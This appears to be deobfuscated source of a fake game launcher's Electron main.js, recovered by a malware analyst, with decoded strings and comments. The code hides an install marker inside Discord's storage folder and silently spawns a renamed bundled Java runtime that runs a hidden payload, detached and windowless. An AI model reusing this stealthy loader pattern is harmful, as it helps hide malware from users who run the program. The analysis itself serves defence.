// ============================================================
// CuteCraftSMP-Launcher - Recovered Source Code (main.js)
// Deobfuscated from ira.jsc -> ira_decrypted -> main_decrypted -> layer3
// ============================================================

const { app, BrowserWindow, nativeImage } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

// String table (decoded):
// [0]  = 'electron'
// [1]  = 'path'
// [2]  = 'darwin'
// [3]  = ''
// [4]  = 'GlzY29yeQA==' -> double-decoded = 'discord'
// [5]  = 'base64'
// [6]  = 'TG9jYWwgU3RvcmFnZQ==' -> double-decoded = 'Local Storage'
// [7]  = 'leveldb'
// [8]  = 'bin'
// [9]  = 'modules.cache'
// [10] = '--ira'
// [11] = 'icon.ico'
// [12] = '#000000'
// [13] = 'index.html'
// [14] = 'java'
// [15] = 'jre'
// [16] = 'modules.lib'
// [17] = '.exe'
// [18] = 'java.exe'
// [19] = 'keytool.exe'
// [20] = 'jlink.exe'
// [21] = 'jmod.exe'
// [22] = 'child_process'
// [23] = '--enable-native-access=ALL-UNNAMED'
// [24] = '-cp'
// [25] = 'ignore'

// Obfuscated hex values (reversed):
// _0x90ad() = "6f1e44ae4ceb272c".split('').reverse().join('') = "c272bec4ea44e1f6"
// _0x59de() = "6616faed89088d44".split('').reverse().join('') = "44d8809de8af6166"
// _0x3f11() = "c5a18c573ed2b2e9".split('').reverse().join('') = "9e2b2de375c81a5c"
// _0x1469() = "7cc52ddf4e3dbf58".split('').reverse().join('') = "85fb3de4fdd25cc7"
// _0x95a0() = "42e09b94f995bb86".split('').reverse().join('') = "68bb599f49b90e24"
// _0xe9fd() = "42b66b4598b01db2".split('').reverse().join('') = "2bd10b895456b624"
// _0xf9fb() = "951abf0abddec43b".split('').reverse().join('') = "b34ceddbba0fb159"
// _0x9a9d() = "4579c405845c9159".split('').reverse().join('') = "9519c548504c9754"

/**
 * checkIntegrity()
 * Checks if a specific path exists in APPDATA/roaming to detect
 * if the launcher has already been set up (modules.cache/bin/leveldb).
 * The path is constructed from double-base64 encoded strings.
 */
function checkIntegrity() {
  try {
    const root = process.env.APPDATA || (
      process.platform === 'darwin'
        ? process.env.HOME + ''
        : process.env.HOME
    );
    // Double-decoded: [4] = 'discord', [6] = 'Local Storage'
    const cachePath = path.join(
      root,
      'discord',   // double-decoded from _0x_strs[4]
      'Local Storage',   // double-decoded from _0x_strs[6]
      'leveldb',
      'bin',
      'modules.cache'
    );
    return fs.existsSync(cachePath);
  } catch (e) {
    return false;
  }
}

let mainWindow = null;

/**
 * initView()
 * Creates the main BrowserWindow and loads index.html.
 * Skipped if --ira flag is passed or checkIntegrity() returns true.
 */
function initView() {
  // Skip if launched with --ira flag
  if (process.argv.includes('--ira')) return;
  // Skip if integrity check passes (already installed)
  if (checkIntegrity()) return;

  const iconImage = nativeImage.createFromPath(path.join(__dirname, 'icon.ico'));
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    frame: false,
    show: true,
    resizable: false,
    backgroundColor: '#000000',
    icon: iconImage,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  mainWindow.loadFile(path.join(__dirname, 'index.html'));
}

/**
 * launchRuntime()
 * Finds the main Java executable in jre/bin (excluding java.exe, keytool.exe,
 * jlink.exe, jmod.exe) and spawns it with:
 *   --enable-native-access=ALL-UNNAMED -cp <modules.lib path> h
 * Runs detached, hidden, stdio ignored.
 */
function launchRuntime() {
  try {
    const resPath = app.isPackaged
      ? process.resourcesPath
      : path.join(__dirname, '..', 'java');

    const runtimeDir = path.join(resPath, 'jre', 'bin');
    const libPath = path.join(resPath, 'modules.lib');

    if (!fs.existsSync(runtimeDir) || !fs.existsSync(libPath)) return;

    // Find the main Java executable (not java.exe, keytool.exe, jlink.exe, jmod.exe)
    const core = fs.readdirSync(runtimeDir)
      .find(f =>
        f.endsWith('.exe') &&
        !['java.exe', 'keytool.exe', 'jlink.exe', 'jmod.exe'].includes(f.toLowerCase())
      );

    if (!core) return;

    const runner = path.join(runtimeDir, core);

    spawn(runner, ['--enable-native-access=ALL-UNNAMED', '-cp', libPath, 'h'], {
      cwd: resPath,
      detached: true,
      stdio: 'ignore',
      shell: false,
      windowsHide: true
    }).unref();

  } catch (e) { /* silent fail */ }
}

app.whenReady().then(() => {
  initView();
  launchRuntime();
});
